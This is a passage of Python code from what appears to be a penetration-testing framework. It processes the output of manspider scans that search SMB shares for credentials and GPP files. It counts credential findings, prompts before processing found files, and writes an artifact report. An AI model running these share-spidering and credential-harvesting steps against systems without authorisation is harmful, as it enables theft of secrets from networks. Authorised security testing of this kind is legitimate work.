                        .get("vulnerabilities", {})
                        .get("smb_share_secrets")
                        if getattr(shell, "report", None)
                        else None
                    )
                    if current_report in (None, "NS", False):
                        shell.update_report_field(domain, "smb_share_secrets", False)
                total_findings, files_with_findings = _count_grouped_credential_findings(credentials)
                total_files_with_findings = int(files_with_findings) + structured_files_with_findings
                if not credentials and structured_files_with_findings == 0:
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    _print_analyzed_no_findings_preview(
                        loot_dir=loot_dir,
                        loot_rel=loot_rel,
                        candidate_files=_count_files_under_path(loot_dir),
                        phase_label=phase_label,
                        preview_limit=5,
                    )
                return {
                    "completed": True,
                    "credential_findings": int(total_findings),
                    "files_with_findings": int(total_files_with_findings),
                    "artifact_hits": 0,
                    "ai_attempted": bool(analysis_context.get("ai_attempted")),
                    "ai_success": analysis_context.get("ai_success"),
                }
            return {"completed": True, "credential_findings": 0, "files_with_findings": 0, "artifact_hits": 0}

        else:
            # For other types, maintain original behavior
            proc = shell.run_command(command)
            if proc is None:
                print_error(
                    "manspider scan failed before returning any output while searching for files in shares."
                )
                return {"completed": False, "artifact_hits": 0}

            if proc.returncode == 0:
                output_directory = loot_dir or "smb/spidering"
                files_found = []

                # Collect all found files
                if not os.path.isdir(output_directory):
                    print_warning_debug(
                        "Manspider output directory missing after successful run: "
                        f"{output_directory}"
                    )
                    return {"completed": True, "artifact_hits": 0}
                for filename in os.listdir(output_directory):
                    if filename.endswith(".json"):
                        continue
                    file_path = os.path.join(output_directory, filename)
                    if os.path.isfile(file_path):
                        files_found.append((filename, file_path))

                if not files_found:
                    print_error("No files found")
                    return {"completed": True, "artifact_hits": 0}

                print_warning("Files found:")
                for filename, file_path in files_found:
                    marked_file = mark_sensitive(filename, "path")
                    marked_path = mark_sensitive(
                        os.path.relpath(file_path, shell._get_workspace_cwd()),
                        "path",
                    )
                    shell.console.print(f"- {marked_file} ({marked_path})")

                artifact_records: list[ArtifactProcessingRecord] = []

                if scan_type == "gpp":
                    # For GPP files, process all automatically
                    for filename, file_path in files_found:
                        artifact_records.append(shell.process_found_file(
                            file_path,
                            domain,
                            scan_type,
                            source_hosts=hosts,
                            source_shares=shares,
                            auth_username=auth_username,
                        ))
                else:
                    # For other types, ask for each file
                    print_info_verbose("Starting analysis process...")
                    for filename, file_path in files_found:
                        respuesta = Confirm.ask(
                            f"Do you want to process the file {filename}?"
                        )
                        if respuesta:
                            print_info_verbose(f"Processing {filename}...")
                            artifact_records.append(shell.process_found_file(
                                file_path,
                                domain,
                                scan_type,
                                source_hosts=hosts,
                                source_shares=shares,
                                auth_username=auth_username,
                            ))
                        else:
                            print_info(f"Skipping {filename}")
                            artifact_records.append(
                                ArtifactProcessingRecord(
                                    path=file_path,
                                    filename=filename,
                                    artifact_type=Path(filename).suffix.lstrip(".") or "file",
                                    status="skipped",
                                    note="Skipped by user.",
                                )
                            )
                report_path = _persist_artifact_processing_report(
                    phase_root_abs=os.path.dirname(output_directory),
                    records=artifact_records,
                )
                _render_artifact_processing_summary(
                    shell,
                    phase_label=str(scan_type).upper(),
                    records=artifact_records,
                    report_path=report_path,
                )
                if artifact_records_extracted_nothing(artifact_records):
                    render_no_extracted_findings_preview(
                        loot_dir=output_directory,
                        loot_rel=os.path.relpath(output_directory, shell._get_workspace_cwd()),
                        analyzed_count=len(files_found),
                        category="artifact",
                        phase_label=str(scan_type).upper(),
                        preview_limit=5,
                    )
                return {"completed": True, "artifact_hits": len(files_found)}
            else:
                print_error("Error executing manspider to search for files")
                print_error(f"Error: {proc.stderr.strip()}")
                return {"completed": False, "artifact_hits": 0}

    except Exception as e:
        telemetry.capture_exception(e)

        error_msg = str(e) if e else "Unknown error"
        error_type = type(e).__name__ if e else "Unknown"
        print_error(f"Error executing manspider: {error_msg}")
        print_error_debug(f"Manspider exception type: {error_type}")
        return {"completed": False, "artifact_hits": 0}
        print_error(f"Error type: {error_type}")
        print_exception(exception=e)
